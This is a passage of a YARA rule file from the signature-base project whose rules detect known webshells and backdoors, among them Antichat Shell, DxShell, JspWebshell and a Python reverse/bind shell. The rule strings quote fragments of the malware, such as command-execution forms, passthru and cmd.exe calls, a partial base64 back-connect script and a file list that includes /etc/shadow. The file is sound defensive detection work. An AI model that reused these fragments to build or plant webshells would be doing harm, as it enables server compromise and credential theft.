		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "33e2891c13b78328da9062fbfcf898b6"
		logic_hash = "31ef69228b66b30300006f63b1e4d6e92c2512caca4bd915d418b48564b39c47"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "$back_connect_p=\"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbi"
		$s3 = "echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=pos"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Backdoor1_Php
{
	meta:
		description = "Semi-Auto-generated  - file backdoor1.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "89f44a1c-8a42-58f6-9308-371f4e652bff"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4358-L4370"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "e1adda1f866367f52de001257b4d6c98"
		logic_hash = "7c8840dc91c16b9fa19fee16e0159a7f13db23c96596e18da0cdab07931ce35b"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "echo \"[DIR] <A HREF=\\\"\".$_SERVER['PHP_SELF'].\"?rep=\".realpath($rep.\".."
		$s2 = "class backdoor {"
		$s4 = "echo \"<a href=\\\"\".$_SERVER['PHP_SELF'].\"?copy=1\\\">Copier un fichier</a> <"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Elmaliseker_Asp
{
	meta:
		description = "Semi-Auto-generated  - file elmaliseker.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "7ecf3d5c-be91-579e-905b-5f2ad03a0e42"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4371-L4384"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b32d1730d23a660fd6aa8e60c3dc549f"
		logic_hash = "969f0f12449375a9ebbb8a68fd4b3db395927416d5cceccdb7f2c64310430880"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "if Int((1-0+1)*Rnd+0)=0 then makeEmail=makeText(8) & \"@\" & makeText(8) & \".\""
		$s1 = "<form name=frmCMD method=post action=\"<%=gURL%>\">"
		$s2 = "dim zombie_array,special_array"
		$s3 = "http://vnhacker.org"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Indexer_Asp
{
	meta:
		description = "Semi-Auto-generated  - file indexer.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "84ff60f9-36f7-5d29-9f38-8088fb42582e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4385-L4396"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "9ea82afb8c7070817d4cdf686abe0300"
		logic_hash = "0a51f15bfb4289dcb70e1e0b96d100be12901ebf26ed9c0e543eda5f4aa91f1c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "<td>Nereye :<td><input type=\"text\" name=\"nereye\" size=25></td><td><input typ"
		$s2 = "D7nD7l.km4snk`JzKnd{n_ejq;bd{KbPur#kQ8AAA==^#~@%>></td><td><input type=\"submit"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Dxshell_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file DxShell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "b89930b7-acf3-5078-8429-d59e27e4b00c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4397-L4408"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "33a2b31810178f4c2e71fbdeb4899244"
		logic_hash = "821f9295eba6119ad08349e769d1909cd7836b4e35795915e94095cf715dc6e5"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx"
		$s2 = "print \"\\n\".'<tr><td width=100pt class=linelisting><nobr>POST (php eval)</td><"

	condition:
		1 of them
}

rule SIGNATURE_BASE_S72_Shell_V1_1_Coding_Html
{
	meta:
		description = "Semi-Auto-generated  - file s72 Shell v1.1 Coding.html.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "dfd3b80e-6245-5f74-9d6a-6006218891ac"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4409-L4421"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "c2e8346a5515c81797af36e7e4a3828e"
		logic_hash = "aef8840b72e5c435c11150007d6b3af2943126fefdc6df343d0f73755340e260"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Dizin</font></b></font><font face=\"Verdana\" style=\"font-size: 8pt\"><"
		$s1 = "s72 Shell v1.0 Codinf by Cr@zy_King"
		$s3 = "echo \"<p align=center>Dosya Zaten Bulunuyor</p>\""

	condition:
		1 of them
}

rule SIGNATURE_BASE_Kacak_Asp
{
	meta:
		description = "Semi-Auto-generated  - file kacak.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "1ae15174-b84a-5826-b768-7afed65196db"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4422-L4435"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "907d95d46785db21331a0324972dda8c"
		logic_hash = "8542a3985dff2d1eb42f4d2c9f30405a4817a8e30075225c518ec52381f1f7df"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Kacak FSO 1.0"
		$s1 = "if request.querystring(\"TGH\") = \"1\" then"
		$s3 = "<font color=\"#858585\">BuqX</font></a></font><font face=\"Verdana\" style="
		$s4 = "mailto:BuqX@hotmail.com"

	condition:
		1 of them
}

rule SIGNATURE_BASE_PHP_Backdoor_Connect_Pl_Php
{
	meta:
		description = "Semi-Auto-generated  - file PHP Backdoor Connect.pl.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "96c9258e-3894-5ee9-b52c-eb7ba7454416"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4436-L4448"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "57fcd9560dac244aeaf95fd606621900"
		logic_hash = "b141546f45767884f9c8b1cc4c09ea25f90c0f3a3633bfeecad78b60e7f20306"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "LorD of IRAN HACKERS SABOTAGE"
		$s1 = "LorD-C0d3r-NT"
		$s2 = "echo --==Userinfo==-- ;"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Antichat_Socks5_Server_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file Antichat Socks5 Server.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "35d0930c-ef07-5fd4-9d7a-c0d685f92339"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4449-L4461"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "cbe9eafbc4d86842a61a54d98e5b61f1"
		logic_hash = "d6b203561f95f431b3d2c241011ae08c05619d45c5900a28137481c029e8297e"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "$port = base_convert(bin2hex(substr($reqmessage[$id], 3+$reqlen+1, 2)), 16, 10);" fullword
		$s3 = "#   [+] Domain name address type"
		$s4 = "www.antichat.ru"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Antichat_Shell_V1_3_Php
{
	meta:
		description = "Semi-Auto-generated  - file Antichat Shell v1.3.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "856cf977-24da-58e0-b6d2-820c92075ecc"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4462-L4474"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "40d0abceba125868be7f3f990f031521"
		logic_hash = "566c324f3bf44ce9f32ddad82a8d3daa87a8a75b5ca0c8286bc912a8ae4ac8e9"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Antichat"
		$s1 = "Can't open file, permission denide"
		$s2 = "$ra44"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Safe_Mode_Bypass_PHP_4_4_2_And_PHP_5_1_2_Php
{
	meta:
		description = "Semi-Auto-generated  - file Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "3e81f628-31b4-5c22-943e-62c8cb4c0c4d"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4475-L4487"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "49ad9117c96419c35987aaa7e2230f63"
		logic_hash = "d6d2a3999f2e8ceb70f57697c0a845edbbcfce0aba151ec6a0ac23f55265cd47"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Welcome.. By This script you can jump in the (Safe Mode=ON) .. Enjoy"
		$s1 = "Mode Shell v1.0</font></span>"
		$s2 = "has been already loaded. PHP Emperor <xb5@hotmail."

	condition:
		1 of them
}

rule SIGNATURE_BASE_Mysql_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file mysql.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "41730336-0dce-5ed9-95b0-c911a4e3cb48"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4488-L4500"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "12bbdf6ef403720442a47a3cc730d034"
		logic_hash = "60e235310f378698ffcc3ae6a07ab5dd94a660ca4b1504cc878d9741f751d5d1"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "action=mysqlread&mass=loadmass\">load all defaults"
		$s2 = "if (@passthru($cmd)) { echo \" -->\"; $this->output_state(1, \"passthru"
		$s3 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = "

	condition:
		1 of them
}

rule SIGNATURE_BASE_Worse_Linux_Shell_Php
{
	meta:
		description = "Semi-Auto-generated  - file Worse Linux Shell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "e223e2a9-7c7a-597a-8b90-a63ee11805ea"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4501-L4512"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8338c8d9eab10bd38a7116eb534b5fa2"
		logic_hash = "47801296b700e85f9e08857eb06f845ef8ed3f88b7d0de34d4b7c47cef6cc7fb"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "print \"<tr><td><b>Server is:</b></td><td>\".$_SERVER['SERVER_SIGNATURE'].\"</td"
		$s2 = "print \"<tr><td><b>Execute command:</b></td><td><input size=100 name=\\\"_cmd"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Cyberlords_Sql_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file cyberlords_sql.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "41730336-0dce-5ed9-95b0-c911a4e3cb48"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4513-L4526"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "03b06b4183cb9947ccda2c3d636406d4"
		logic_hash = "b3286f9fd86c90c5afc79801b6d65c9ae52ee1c37da93ff15461d84f37ef8019"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Coded by n0 [nZer0]"
		$s1 = " www.cyberlords.net"
		$s2 = "U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAMUExURf///wAAAJmZzAAAACJoURkAAAAE"
		$s3 = "return \"<BR>Dump error! Can't write to \".htmlspecialchars($file);"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Cmd_Asp_5_1_Asp
{
	meta:
		description = "Semi-Auto-generated  - file cmd-asp-5.1.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "fc204ab8-892d-5435-a737-a185ca32e938"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4527-L4538"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8baa99666bf3734cbdfdd10088e0cd9f"
		logic_hash = "a41c83da1a65e67b6f4ac6ad7cc8702486957ab0c7dda658d071e603338c324b"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Call oS.Run(\"win.com cmd.exe /c del \"& szTF,0,True)" fullword
		$s3 = "Call oS.Run(\"win.com cmd.exe /c \"\"\" & szCMD & \" > \" & szTF &" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Pws_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file pws.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "1ec47c33-dbec-50bd-b4b0-8f00b704a816"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4539-L4551"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "ecdc6c20f62f99fa265ec9257b7bf2ce"
		logic_hash = "98dae8aab5bfd58f4264e318f5a5b5900b38687386f9d7f09c31da0f51d57bc0"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "<div align=\"left\"><font size=\"1\">Input command :</font></div>" fullword
		$s1 = "<input type=\"text\" name=\"cmd\" size=\"30\" class=\"input\"><br>" fullword
		$s4 = "<input type=\"text\" name=\"dir\" size=\"30\" value=\"<? passthru(\"pwd\"); ?>"

	condition:
		2 of them
}

rule SIGNATURE_BASE_PHP_Shell_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file PHP Shell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "6978126c-5414-52d2-b085-6e5589716d93"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4552-L4563"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "a2f8fa4cce578fc9c06f8e674b9e63fd"
		logic_hash = "2d5b6e08bfe9e1551dab12b01189dadc924c097427c996684bab96c48d528395"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "echo \"</form><form action=\\\"$SFileName?$urlAdd\\\" method=\\\"post\\\"><input"
		$s1 = "echo \"<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\"><input type="

	condition:
		all of them
}

rule SIGNATURE_BASE_Ayyildiz_Tim___AYT__Shell_V_2_1_Biz_Html
{
	meta:
		description = "Semi-Auto-generated  - file Ayyildiz Tim  -AYT- Shell v 2.1 Biz.html.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "d50a8669-fd28-59d2-9f00-f4fe2b85dc22"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4564-L4577"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8a8c8bb153bd1ee097559041f2e5cf0a"
		logic_hash = "9e2d56b49df65a2c13e15f97ec91cdbb6852d86e86f921d7c8a4db82cbea12f5"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Ayyildiz"
		$s1 = "TouCh By iJOo"
		$s2 = "First we check if there has been asked for a working directory"
		$s3 = "http://ayyildiz.org/images/whosonline2.gif"

	condition:
		2 of them
}

rule SIGNATURE_BASE_EFSO_2_Asp
{
	meta:
		description = "Semi-Auto-generated  - file EFSO_2.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "f0566790-b41c-5167-b7ec-19e7d04256d1"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4578-L4589"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b5fde9682fd63415ae211d53c6bfaa4d"
		logic_hash = "15e5419854bcbb08f28fff1e266cca7a004f01ec0a5c313c107ec17c3aa7ffee"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Ejder was HERE"
		$s1 = "*~PU*&BP[_)f!8c2F*@#@&~,P~P,~P&q~8BPmS~9~~lB~X`V,_,F&*~,jcW~~[_c3TRFFzq@#@&PP,~~"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Lamashell_Php
{
	meta:
		description = "Semi-Auto-generated  - file lamashell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "cbbb3377-ef9c-5fd1-a8b8-2b730fb5ef28"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4590-L4602"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "de9abc2e38420cad729648e93dfc6687"
		logic_hash = "5e156c3057338fa7b306b91dd979851dd56b8b698cfe99e1d7b6d096a4c580e7"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "lama's'hell" fullword
		$s1 = "if($_POST['king'] == \"\") {"
		$s2 = "if (move_uploaded_file($_FILES['fila']['tmp_name'], $curdir.\"/\".$_FILES['f"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Ajax_PHP_Command_Shell_Php
{
	meta:
		description = "Semi-Auto-generated  - file Ajax_PHP Command Shell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "cae2e035-ae7b-589b-b2d9-e709028274c5"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4603-L4615"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "93d1a2e13a3368a2472043bd6331afe9"
		logic_hash = "37cba26018f3d37194a143871012a61a7bcee6775d2cf5f93a52b779010d3260"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "newhtml = '<b>File browser is under construction! Use at your own risk!</b> <br>"
		$s2 = "Empty Command..type \\\"shellhelp\\\" for some ehh...help"
		$s3 = "newhtml = '<font size=0><b>This will reload the page... :(</b><br><br><form enct"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Jspwebshell_1_2_Jsp
{
	meta:
		description = "Semi-Auto-generated  - file JspWebshell 1.2.jsp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "edfe6a3d-7d56-52ad-a376-cec5722e87b7"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4616-L4629"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "70a0ee2624e5bbe5525ccadc467519f6"
		logic_hash = "32b3ddb00f89a3540118fe8ce5fc070556b00030dcf2b21245d38ae66e6cbc14"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "JspWebshell"
		$s1 = "CreateAndDeleteFolder is error:"
		$s2 = "<td width=\"70%\" height=\"22\">&nbsp;<%=env.queryHashtable(\"java.c"
		$s3 = "String _password =\"111\";"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Sincap_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file Sincap.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "8c4dc7b1-94ce-5528-8442-eae05d2c9980"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4630-L4642"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b68b90ff6012a103e57d141ed38a7ee9"
		logic_hash = "e708a7dcb26ff7d0208c1f092e14e701f2ae94c4ffca019f13064bbe04ef74d7"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "$baglan=fopen(\"/tmp/$ekinci\",'r');"
		$s2 = "$tampon4=$tampon3-1"
		$s3 = "@aventgrup.net"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Phyton_Shell_Py
{
	meta:
		description = "Semi-Auto-generated  - file Phyton Shell.py.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "2f55d60d-94f3-508d-a2d0-5ab59e3fdab3"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4656-L4669"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "92b3c897090867c65cc169ab037a0f55"
		logic_hash = "ac16a95cd1fb09c93b315e3cd7d57c1ebec322b641f515854fb73a61393dd365"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "sh_out=os.popen(SHELL+\" \"+cmd).readlines()" fullword
		$s2 = "#   d00r.py 0.3a (reverse|bind)-shell in python by fQ" fullword
		$s3 = "print \"error; help: head -n 16 d00r.py\"" fullword
		$s4 = "print \"PW:\",PW,\"PORT:\",PORT,\"HOST:\",HOST" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Mysql_Tool_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file mysql_tool.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "c67197d1-6e40-5bf2-9e1b-6ada43529435"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4670-L4682"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "5fbe4d8edeb2769eda5f4add9bab901e"
		logic_hash = "9f49bd6c56c919f678ecada82ff3d801c82c98a8abdee85cda1ec7e5b6756012"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "$error_text = '<strong>Failed selecting database \"'.$this->db['"
		$s1 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERV"
		$s4 = "<div align=\"center\">The backup process has now started<br "

	condition:
		1 of them
}

rule SIGNATURE_BASE_Zehir_4_Asp
{
	meta:
		description = "Semi-Auto-generated  - file Zehir 4.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ea7df4e1-d4e2-5a58-a014-d12cb9afaf79"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4683-L4694"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "7f4e12e159360743ec016273c3b9108c"
		logic_hash = "69063d866daf1709df81fa22d76177bf8d552e19725a94db4a1b2fca79387faf"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s2 = "</a><a href='\"&dosyapath&\"?status=10&dPath=\"&f1.path&\"&path=\"&path&\"&Time="
		$s4 = "<input type=submit value=\"Test Et!\" onclick=\""

	condition:
		1 of them
}

rule SIGNATURE_BASE_Sh_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file sh.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "da691516-d6c9-5c4b-85c3-f1cd7fc96ae7"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4695-L4706"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "330af9337ae51d0bac175ba7076d6299"
		logic_hash = "b0c3307d451e5d7dadece114e2888503a46038e2edb2ff32bf566ce47b300e76"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "$ar_file=array('/etc/passwd','/etc/shadow','/etc/master.passwd','/etc/fstab','/e"
		$s2 = "Show <input type=text size=5 value=\".((isset($_POST['br_st']))?$_POST['br_st']:"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Phpbackdoor15_Php
{
	meta:
		description = "Semi-Auto-generated  - file phpbackdoor15.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "a93b881b-3050-5f43-803c-4a571aaaef82"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4707-L4719"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "0fdb401a49fc2e481e3dfd697078334b"
		logic_hash = "cdd105f36593e8326ca32bf7cf1fba6fb754e7305c91fe6c078323db8f59b23c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "echo \"fichier telecharge dans \".good_link(\"./\".$_FILES[\"fic\"][\"na"
		$s2 = "if(move_uploaded_file($_FILES[\"fic\"][\"tmp_name\"],good_link(\"./\".$_FI"
		$s3 = "echo \"Cliquez sur un nom de fichier pour lancer son telechargement. Cliquez s"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Phpjackal_Php
{
	meta:
		description = "Semi-Auto-generated  - file phpjackal.php.txt"
